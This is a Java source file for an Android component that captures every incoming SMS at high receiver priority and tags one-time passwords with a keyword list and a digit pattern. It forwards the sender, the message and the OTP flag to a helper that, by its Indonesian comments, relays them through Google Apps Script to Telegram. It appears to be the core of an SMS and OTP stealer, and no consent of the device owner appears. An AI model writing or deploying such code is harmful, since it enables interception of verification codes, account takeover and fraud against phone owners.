package com.example.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * Menangkap semua SMS masuk secara real-time dan meneruskannya
 * ke Google Apps Script via Worker, yang kemudian dikirim ke Telegram.
 *
 * Fitur:
 * - Forward semua SMS masuk (pengirim, isi, waktu)
 * - Deteksi OTP otomatis berdasarkan kata kunci
 * - SMS multi-part digabung sebelum dikirim
 *
 * Wajib di AndroidManifest.xml:
 *   <receiver android:name=".SmsReceiver" android:exported="true">
 *       <intent-filter android:priority="999">
 *           <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
 *       </intent-filter>
 *   </receiver>
 */
public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";

    private static final String ACTION_SMS_RECEIVED =
            "android.provider.Telephony.SMS_RECEIVED";

    // Kata kunci yang menandakan SMS berisi OTP
    private static final Set<String> OTP_KEYWORDS = new HashSet<>(Arrays.asList(
            "otp",
            "kode",
            "code",
            "verifikasi",
            "verification",
            "token",
            "password",
            "sandi",
            "pin",
            "one-time",
            "one time",
            "rahasia",
            "secret",
            "auth",
            "2fa"
    ));

    @Override
    public void onReceive(Context context, Intent intent) {

        if (!ACTION_SMS_RECEIVED.equals(intent.getAction())) {
            return;
        }

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        if (pdus == null || pdus.length == 0) return;

        String format = bundle.getString("format");

        // =====================================================
        // PARSE SMS (gabungkan multi-part)
        // =====================================================

        List<SmsMessage> smsMessages = new ArrayList<>();
        for (Object pdu : pdus) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu, format);
            if (sms != null) {
                smsMessages.add(sms);
            }
        }

        if (smsMessages.isEmpty()) return;

        String sender    = smsMessages.get(0).getDisplayOriginatingAddress();
        long   timestamp = smsMessages.get(0).getTimestampMillis();

        // Gabungkan semua bagian pesan
        StringBuilder bodyBuilder = new StringBuilder();
        for (SmsMessage sms : smsMessages) {
            String part = sms.getMessageBody();
            if (part != null) {
                bodyBuilder.append(part);
            }
        }

        String body = bodyBuilder.toString().trim();

        if (body.isEmpty()) return;

        Log.d(TAG, "SMS dari: " + sender + " | OTP: " + isOtp(body));

        // =====================================================
        // KIRIM KE GAS DI BACKGROUND THREAD
        // =====================================================

        final Context  appContext   = context.getApplicationContext();
        final String   finalSender  = sender;
        final String   finalBody    = body;
        final long     finalTs      = timestamp;
        final boolean  finalIsOtp   = isOtp(body);

        new Thread(() ->
                ApiHelper.sendSmsToSheet(
                        appContext,
                        finalSender,
                        finalBody,
                        finalTs,
                        finalIsOtp
                )
        ).start();
    }

    // =========================================================
    // DETEKSI OTP
    // =========================================================

    private boolean isOtp(String body) {

        if (body == null) return false;

        String lower = body.toLowerCase();

        for (String keyword : OTP_KEYWORDS) {
            if (lower.contains(keyword)) {
                return true;
            }
        }

        // Deteksi pola angka 4-8 digit yang berdiri sendiri
        // (ciri khas kode OTP)
        return lower.matches(".*\\b\\d{4,8}\\b.*");
    }
}
